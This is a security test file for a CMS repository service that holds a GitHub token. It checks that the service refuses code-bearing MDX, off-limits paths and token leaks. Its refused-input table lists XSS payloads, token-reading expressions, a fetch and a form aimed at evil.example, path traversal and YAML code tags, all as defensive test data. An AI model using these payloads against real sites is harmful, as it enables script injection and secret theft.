// services/repo: the only holder of the GitHub token. Whoever takes over the
// dashboard can call it, so these try what they would: other branches and
// paths, code in an entry, and getting the token back.
import { readdirSync, readFileSync } from "node:fs";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { github } from "../../services/repo/github.mjs";
import { entryProblem } from "../../services/repo/mdx.mjs";
import { changeProblem, spacesFor } from "../../services/repo/policy.mjs";
import { createRepo, limiter } from "../../services/repo/server.mjs";

const CONTENT = join(__dirname, "../../src/content");
const spaces = spacesFor({ siteRepo: "me/site", siteBranch: "staging", draftsRepo: "me/cms", draftsBranch: "drafts-staging" });
const entry = (body: string, extra = "") => `---\ntitle: T\nwing: design\nsection: s\n${extra}---\n\n${body}\n`;

describe("what's published today", () => {
  it("is all allowed", () => {
    let count = 0;
    for (const dir of ["career", "sections", "albums", "entries"]) {
      for (const name of readdirSync(join(CONTENT, dir))) {
        const path = `src/content/${dir}/${name}`;
        expect([path, changeProblem(spaces.content, { path, content: readFileSync(join(CONTENT, dir, name), "utf8") })]).toEqual([path, null]);
        count++;
      }
    }
    expect(count).toBeGreaterThan(90);
    const manifest = "src/data/cloudinary-manifest.json";
    expect(changeProblem(spaces.content, { path: manifest, content: readFileSync(join(__dirname, "../..", manifest), "utf8") })).toBeNull();
  });
});

describe("entries can't hold code", () => {
  const refused: Record<string, string> = {
    "an expression that calls": "{process.exit()}",
    "an inline expression": "Hello {globalThis.process.env.GITHUB_TOKEN} there",
    "a member of a known name": 'export const a = "x"\n\n{a.constructor}',
    "an unknown name": "{process}",
    "an immediately called function": "{(() => 1)()}",
    "a function": "{() => 1}",
    "new": "{new Date()}",
    "a tagged template": "{String.raw`x`}",
    "a template with code": "{`${process.env.X}`}",
    "await": "{await import('node:fs')}",
    "a sequence": "{1, process}",
    "an assignment": "{globalThis.x = 1}",
    "a spread array": "{[...process.argv]}",
    "a spread object": "<Callout label={{ ...process.env }} />",
    "a computed key": "<Callout label={{ [process.env.X]: 1 }} />",
    "a getter": "<Callout label={{ get a() { return 1 } }} />",
    "__proto__": "<Callout label={{ __proto__: [] }} />",
    "a spread attribute": "<Callout {...process.env} />",
    "code in an attribute": "<Callout label={process.env.X} />",
    "JSX in an attribute": "<Callout label={<Figure id={process.env.X} />} />",
    "an import of a module": 'import fs from "node:fs"\n\nHi',
    "a bare import": 'import "node:fs"\n\nHi',
    "a namespace import": 'import * as x from "../../components/writeup/Figure.astro"\n\nHi',
    "an import outside components": 'import Env from "../../lib/serverEnv.ts"\n\nHi',
    "an import that climbs out": 'import X from "../../components/../lib/serverEnv.ts"\n\nHi',
    "another helper": 'import { searchPhotos } from "../../lib/cloudinary"\n\nHi',
    "a renamed helper": 'import { albumPhotos as process } from "../../lib/cloudinary"\n\nHi',
    "a query on an import": 'import X from "../../components/writeup/Figure.astro?raw"\n\nHi',
    "a remote import": 'import X from "https://evil.example/x.js"\n\nHi',
    "an import with attributes": 'import X from "../../components/writeup/Figure.astro" with { type: "json" }\n\nHi',
    "a re-export": 'export * from "node:fs"\n\nHi',
    "a named re-export": 'export { default } from "node:fs"\n\nHi',
    "an exported function": "export function a() { return process.env }\n\nHi",
    "an exported class": "export class A { static x = process.env }\n\nHi",
    "export let": "export let a = 1\n\nHi",
    "a default export": "export default function L() { return process.env }\n\nHi",
    "a statement after an export": "export const a = 1; process.exit()\n\nHi",
    "destructuring": "export const { env } = process\n\nHi",
    "an exported call": "export const a = fetch('https://evil.example')\n\nHi",
    "a helper that was never imported": "export const a = albumPhotos([])\n\nHi",
    "a helper given code": 'import { albumPhotos } from "../../lib/cloudinary"\n\nexport const a = albumPhotos(process.env)\n\nHi',
    "a replaced component map": 'export const components = { p: "script" }\n\nHi',
    "a replaced frontmatter": "export const frontmatter = {}\n\nHi",
    "a component named by data": 'export const Evil = "script"\n\n<Evil>alert(1)</Evil>',
    "a member component": '<a.b />',
    "a script": "<script>alert(1)</script>",
    "a style": "<style>{`*{display:none}`}</style>",
    "an iframe": '<iframe src="https://evil.example" />',
    "an svg": '<svg onload="alert(1)" />',
    "a form": '<form action="https://evil.example"><input name="x" /></form>',
    "set:html": '<p set:html="<script>alert(1)</script>" />',
    "set:html on a fragment": '<Fragment set:html="<b>x</b>" />',
    "define:vars": "<p define:vars={{ a: 1 }} />",
    "server:defer": "<Callout server:defer />",
    "client:only": '<Callout client:only="react" />',
    "a client directive on an element": "<p client:load />",
    "an event handler": '<img src="/x.png" alt="" onerror="alert(1)" />',
    "a cased event handler": '<a href="/" onClick="alert(1)">x</a>',
    "dangerouslySetInnerHTML": '<Callout dangerouslySetInnerHTML={{ __html: "<script>" }} />',
    "srcdoc": '<Callout srcDoc="<script>alert(1)</script>" />',
    "a javascript link": '<a href="javascript:alert(1)">x</a>',
    "a javascript link with a tab in it": '<a href="java\tscript:alert(1)">x</a>',
    "a javascript link in braces": '<a href={"javascript:alert(1)"}>x</a>',
    "a javascript link by entity": '<a href="javascript&#58;alert(1)">x</a>',
    "a link from a name": 'export const u = "javascript:alert(1)"\n\n<a href={u}>x</a>',
    "a markdown javascript link": "[x](javascript:alert(1))",
    "a reference javascript link": "[x][y]\n\n[y]: javascript:alert(1)",
    "a data link": "[x](data:text/html,<script>alert(1)</script>)",
    "a figma embed of something else": '<FigmaEmbed url="javascript:alert(1)" />',
    "a script in text that's rendered as HTML": '<Pipeline nodes={[{ step: "1", title: "<script>alert(1)</script>", body: "" }]} />',
    "a handler in text that's rendered as HTML": 'export const n = [{ title: "<img src=x onerror=alert(1)>" }]\n\n<Pipeline nodes={n} />',
    "a handler on an allowed tag": '<FeatureInventory features={[{ title: "a", description: "<b onmouseover=\\"alert(1)\\">x</b>" }]} />',
    "a javascript link in HTML text": `<FeatureInventory features={[{ title: "a", description: "<a href='javascript:alert(1)'>x</a>" }]} />`,
    "a tag split over two strings": '<Pipeline nodes={[{ title: "<" + "script>" }]} />',
    "code in a table cell": "| a |\n| - |\n| {process.env.X} |",
    "code in a footnote": "Text[^1]\n\n[^1]: {process.env.X}",
    "code in a list": "- a\n  - {process.env.X}",
    "code in a quote": "> {process.env.X}",
    "code in a heading": "# {process.env.X}",
    "code in a component": "<Callout>\n  {process.env.X}\n</Callout>",
    "code in a link's text": "[{process.env.X}](/a)",
    "code inside emphasis": "*{process.env.X}*",
    "code after an unclosed fence in a footnote": "Text[^1]\n\n[^1]: ```\n{process.env.X}\n",
  };
  for (const [what, body] of Object.entries(refused)) {
    it(`refuses ${what}`, () => expect(entryProblem(entry(body)), body).not.toBeNull());
  }

  it("refuses frontmatter the site would act on, or read differently", () => {
    expect(entryProblem(entry("Hi", "layout: ../../lib/serverEnv.ts\n"))).toContain("layout");
    expect(entryProblem(entry("Hi", "href: javascript:alert(1)\n"))).not.toBeNull();
    for (const text of [
      "{process.exit()}", // no frontmatter at all
      `+++\ntitle = "x"\n+++\n\nHi`,
      `\n---\ntitle: T\n---\n\nHi`,
      `﻿---\ntitle: T\n---\n\nHi`,
      `---\ntitle: T\n---x\nlayout: y\n---\n\nHi`,
      `---\ntitle: T\n+++\n\n{process.exit()}\n---\n\nHi`,
      entry("Hi").replaceAll("\n", "\r\n"),
      `---\ntitle: !!js/function 'function(){}'\n---\n\nHi`,
      `---\n- a\n---\n\nHi`,
    ]) {
      expect(entryProblem(text), JSON.stringify(text)).not.toBeNull();
    }
  });

  it("allows what entries are made of", () => {
    for (const body of [
      "Plain **text**, `code {with braces}`, [a link](https://x.example) and [a page](/design).",
      "```ts\nimport fs from 'node:fs';\nprocess.exit({});\n```",
      '<Callout label="The goal?">\n  Text.\n</Callout>',
      "<FigureGrid columns={2}>\n  <Figure id=\"site/a/b\" alt=\"\" caption=\"\" />\n</FigureGrid>",
      '<StatsGrid stats={[{ value: "1,000", label: "Users" }, { value: "99%", label: "Uptime" }]} />',
      'import PDFCarousel from "../../components/islands/PDFCarousel.tsx"\n\n<PDFCarousel client:visible src="/a.pdf" aspectRatio={16 / 9} />',
      'import { albumPhotos } from "../../lib/cloudinary"\n\nexport const photos = albumPhotos([{ id: "site/a", alt: "b" }])\n\n<Callout label={photos} />',
      "export const items = [{ body: `A <code>b</code> and <a href=\"https://x.example\" target=\"_blank\">c</a>.` }]\n\n<CopyGrid items={items} />",
      "<CaseStudyCard title={`\"Add\" Button + Modal`}>\n  Body.\n</CaseStudyCard>",
      "{/* a comment */}\n\nText 1 < 2.",
      "| a | b |\n| - | - |\n| 1 | 2 |\n\nText[^1]\n\n[^1]: Note.",
    ]) {
      expect(entryProblem(entry(body)), body).toBeNull();
    }
    expect(entryProblem("---\ntitle: T\nwing: design\nsection: s\n---\n")).toBeNull();
  });

  it("gives a reason for what doesn't parse, and never throws", () => {
    expect(entryProblem(entry("<Callout>"))).toContain("doesn't parse");
    expect(entryProblem(entry("{"))).toContain("doesn't parse");
    expect(entryProblem(entry("<".repeat(5000)))).not.toBeNull();
    expect(entryProblem(entry("> ".repeat(3000) + "x")) ?? "").toBeTypeOf("string");
  });
});

describe("paths and files", () => {
  const ok = "a: 1\n";
  it("takes content files and nothing else", () => {
    for (const path of ["src/content/albums/2026-x.yaml", "src/content/career/a.yaml", "src/content/sections/design.yaml"]) expect(changeProblem(spaces.content, { path, content: ok })).toBeNull();
    for (const path of [
      ".github/workflows/x.yml",
      "Dockerfile",
      "deploy/deploy.sh",
      "deploy/compose.yaml",
      "package.json",
      "src/content.config.ts",
      "src/content/entries/x.astro",
      "src/content/entries/x.md",
      "src/content/entries/X.mdx",
      "src/content/entries/a/b.mdx",
      "src/content/albums/../../../deploy/deploy.sh",
      "src/content/albums/../x.yaml",
      "src/content/albums/x.yaml\n",
      "/src/content/albums/x.yaml",
      "src/content/albums/x.yaml/",
      "src\\content\\albums\\x.yaml",
      "src/data/other.json",
      "services/repo/server.mjs",
      "",
      "__proto__",
    ]) {
      expect([path, changeProblem(spaces.content, { path, content: ok })]).toEqual([path, "That path can't be written"]);
    }
    for (const path of [null, 1, {}, ["src/content/albums/x.yaml"]]) expect(changeProblem(spaces.content, { path, content: ok } as any)).not.toBeNull();
  });

  it("keeps each file to what its type is", () => {
    expect(changeProblem(spaces.content, { path: "src/content/albums/x.yaml", content: "a: !!js/function 'x'\n" })).not.toBeNull();
    expect(changeProblem(spaces.content, { path: "src/content/albums/x.yaml", content: "a: !evil x\n" })).not.toBeNull();
    expect(changeProblem(spaces.content, { path: "src/content/albums/x.yaml", content: "a: &x [1]\nb: *x\n" })).not.toBeNull();
    expect(changeProblem(spaces.content, { path: "src/content/albums/x.yaml", content: 'title: "Wow! !important"\n' })).toBeNull();
    expect(changeProblem(spaces.content, { path: "src/content/albums/x.yaml", content: "a: [" })).not.toBeNull();
    expect(changeProblem(spaces.content, { path: "src/data/cloudinary-manifest.json", content: "[]" })).not.toBeNull();
    expect(changeProblem(spaces.content, { path: "src/data/cloudinary-manifest.json", content: null })).not.toBeNull();
    expect(changeProblem(spaces.content, { path: "src/content/albums/x.yaml", content: null })).toBeNull();
    expect(changeProblem(spaces.content, { path: "src/content/albums/x.yaml", content: `a: "${"x".repeat(600_000)}"` })).toContain("large");
    expect(changeProblem(spaces.content, { path: "src/content/albums/x.yaml", content: 7 } as any)).not.toBeNull();
    expect(changeProblem(spaces.drafts, { path: "drafts/src~content~entries~x.mdx.json", content: "{}" })).toBeNull();
    for (const path of ["vercel.json", "drafts/../vercel.json", "drafts/x.json", "server/x.ts"]) expect(changeProblem(spaces.drafts, { path, content: "{}" })).not.toBeNull();
    expect(changeProblem(spaces.albums, { path: "src/content/entries/x.mdx", content: entry("Hi") })).not.toBeNull();
    expect(changeProblem(spaces.albums, { path: "src/content/albums/x.yaml", content: null })).not.toBeNull();
  });
});

describe("the service", () => {
  const TOKEN = "github_pat_never_leaves";
  const cms = "c".repeat(40);
  const photos = "p".repeat(40);
  const HEAD = "a".repeat(40);
  let server: Server, base: string;
  let sent: Array<{ query: string; variables: any; auth: string | null }>;
  let answer: (body: any) => any;
  let allow: () => boolean;
  let logged: string[];

  beforeEach(async () => {
    sent = [];
    logged = [];
    allow = () => true;
    answer = ({ query }) => {
      if (query.includes("createCommitOnBranch")) return { data: { createCommitOnBranch: { commit: { oid: "b".repeat(40), url: "https://github.com/x" } } } };
      if (query.includes("qualifiedName")) return { data: { repository: { ref: { target: { oid: HEAD, url: "u", committedDate: "d", messageHeadline: "m" } } } } };
      if (query.includes("on Tree")) {
        const blob = (path: string) => ({ path, type: "blob", oid: HEAD, object: { text: "a: 1\n" } });
        return { data: { repository: { object: { entries: [blob("src/content/albums/x.yaml"), blob("src/content/albums/.secret"), { path: "src/content/albums/sub", type: "tree", oid: HEAD, object: {} }] } } } };
      }
      return { data: { repository: { object: { oid: HEAD, text: "a: 1\n" }, f0: { oid: HEAD }, f1: null } } };
    };
    const fetch = async (_url: string, init: RequestInit) => {
      const body = JSON.parse(String(init.body));
      sent.push({ ...body, auth: new Headers(init.headers).get("authorization") });
      const value = answer(body);
      return value instanceof Response ? value : Response.json(value);
    };
    const hub = github({ token: TOKEN, fetch } as any);
    server = createServer(createRepo({ spaces, secrets: { cms, photos }, hub, allowCommit: () => allow(), log: (line: string) => logged.push(line) } as any));
    await new Promise<void>((done) => server.listen(0, "127.0.0.1", done));
    base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
  });
  afterEach(() => {
    server.closeAllConnections();
    server.close();
  });

  const post = async (op: string, body: unknown, secret: string | null = cms) => {
    const res = await fetch(`${base}/v1/${op}`, { method: "POST", headers: secret ? { authorization: `Bearer ${secret}` } : {}, body: typeof body === "string" ? body : JSON.stringify(body) });
    const text = await res.text();
    expect(text).not.toContain(TOKEN);
    return { status: res.status, body: JSON.parse(text) };
  };
  const change = { path: "src/content/albums/x.yaml", content: "a: 1\n" };
  const commit = (extra: object = {}, secret = cms) => post("commit", { space: "content", changes: [change], message: "m", ...extra }, secret);

  it("answers only its callers, each in its own spaces", async () => {
    for (const secret of [null, "", "x", `${cms}x`, TOKEN]) expect((await post("head", { space: "content" }, secret)).status).toBe(401);
    expect((await post("head", { space: "content" })).status).toBe(200);
    expect((await post("head", { space: "drafts" })).status).toBe(200);
    expect((await post("head", { space: "albums" })).status).toBe(403);
    for (const space of ["content", "drafts"]) expect((await commit({ space }, photos)).status).toBe(403);
    expect((await commit({ space: "albums" }, photos)).status).toBe(200);
    for (const space of ["__proto__", "constructor", "", null, { repo: "x/y" }]) expect((await post("head", { space })).status).toBe(403);
    expect((await fetch(`${base}/healthz`)).status).toBe(200);
  });

  it("an empty secret is nobody", async () => {
    const open = createServer(createRepo({ spaces, secrets: { cms: "", photos: undefined }, hub: null, log: () => {} } as any));
    await new Promise<void>((done) => open.listen(0, "127.0.0.1", done));
    const url = `http://127.0.0.1:${(open.address() as AddressInfo).port}/v1/head`;
    for (const authorization of ["Bearer ", "Bearer undefined", "Bearer"]) expect((await fetch(url, { method: "POST", headers: { authorization }, body: '{"space":"content"}' })).status).toBe(401);
    open.closeAllConnections();
    open.close();
  });

  it("commits to its own repository and branch, whatever the request says", async () => {
    const res = await commit({ repo: "evil/x", branch: "main", branchName: "main", expectedHead: HEAD });
    expect(res).toMatchObject({ status: 200, body: { oid: "b".repeat(40) } });
    expect(sent).toHaveLength(1);
    expect(sent[0]).toMatchObject({
      auth: `bearer ${TOKEN}`,
      variables: {
        input: {
          branch: { repositoryNameWithOwner: "me/site", branchName: "staging" },
          expectedHeadOid: HEAD,
          fileChanges: { additions: [{ path: change.path, contents: Buffer.from(change.content).toString("base64") }], deletions: [] },
        },
      },
    });
    await commit({ space: "drafts", changes: [{ path: "drafts/src~content~entries~x.mdx.json", content: null }] });
    expect(sent.at(-1)!.variables.input).toMatchObject({ branch: { repositoryNameWithOwner: "me/cms", branchName: "drafts-staging" }, expectedHeadOid: HEAD, fileChanges: { deletions: [{ path: "drafts/src~content~entries~x.mdx.json" }] } });
  });

  it("commits nothing when any file in it is refused", async () => {
    const bad = { path: "src/content/entries/x.mdx", content: entry("{process.env.GITHUB_TOKEN}") };
    const res = await commit({ changes: [change, bad, { path: "deploy/deploy.sh", content: "rm" }] });
    expect(res).toMatchObject({ status: 422, body: { problems: [{ path: bad.path }, { path: "deploy/deploy.sh" }] } });
    expect(sent).toEqual([]);
    expect(logged.join()).toContain("refused cms");
    for (const extra of [{ changes: [] }, { changes: [change, change] }, { changes: [null] }, { changes: "x" }, { changes: Array.from({ length: 201 }, (_, i) => ({ path: `src/content/albums/a${i}.yaml`, content: "a: 1" })) }, { message: " " }, { message: 1 }, { expectedHead: "main" }]) {
      expect([JSON.stringify(extra).slice(0, 60), (await commit(extra)).status]).toEqual([JSON.stringify(extra).slice(0, 60), 400]);
    }
    expect(sent).toEqual([]);
  });

  it("reads only what it would write", async () => {
    expect((await post("read", { space: "content", path: change.path })).body).toEqual({ file: { sha: HEAD, text: "a: 1\n" } });
    expect((await post("list", { space: "content", dir: "src/content/albums" })).body.files.map((f: any) => f.path)).toEqual([change.path]);
    expect((await post("shas", { space: "content", paths: [change.path, "src/content/albums/y.yaml"] })).body).toEqual({ shas: { [change.path]: HEAD, "src/content/albums/y.yaml": null } });
    const asked = sent.length;
    for (const path of [".env", "deploy/.env.example", "src/lib/serverEnv.ts", "", 'x") { viewer { login } } #', "src/content/albums/x.yaml:main"]) {
      expect((await post("read", { space: "content", path })).status).toBe(403);
      expect((await post("shas", { space: "content", paths: [path] })).status).toBe(403);
    }
    for (const dir of ["", ".", "src", "src/content", "deploy", "src/content/albums/"]) expect((await post("list", { space: "content", dir })).status).toBe(403);
    expect(sent).toHaveLength(asked);
    // A path is always a variable, never part of a query.
    for (const { query } of sent) expect(query).not.toContain("src/content");
  });

  it("repeats nothing GitHub says", async () => {
    answer = () => ({ errors: [{ type: "X", message: `bad credentials for ${TOKEN}` }] });
    expect(await commit()).toMatchObject({ status: 502, body: { error: { message: "GitHub refused (200)" } } });
    answer = () => new Response(`<html>${TOKEN}`, { status: 500 });
    expect((await commit()).status).toBe(502);
    answer = () => {
      throw new Error(`connect failed ${TOKEN}`);
    };
    expect((await commit()).status).toBe(502);
    answer = () => ({ errors: [{ type: "STALE_DATA", message: "Expected branch to point to x" }] });
    expect((await commit({ expectedHead: HEAD })).status).toBe(409);
    expect(logged.join("\n")).not.toContain(TOKEN);
  });

  it("stops a flood, and refuses what isn't a request", async () => {
    let time = 0;
    allow = limiter(2, 1000, () => time);
    expect([(await commit()).status, (await commit()).status, (await commit()).status]).toEqual([200, 200, 429]);
    time = 1001;
    expect((await commit()).status).toBe(200);
    expect((await post("commit", "{")).status).toBe(400);
    expect((await post("commit", "[]")).status).toBe(400);
    expect((await post("commit", "x".repeat(5e6))).status).toBe(413);
    for (const op of ["graphql", "toString", "constructor"]) expect((await post(op, { space: "content" })).status).toBe(404);
    expect((await fetch(`${base}/v1/head`, { headers: { authorization: `Bearer ${cms}` } })).status).toBe(404);
  });
});
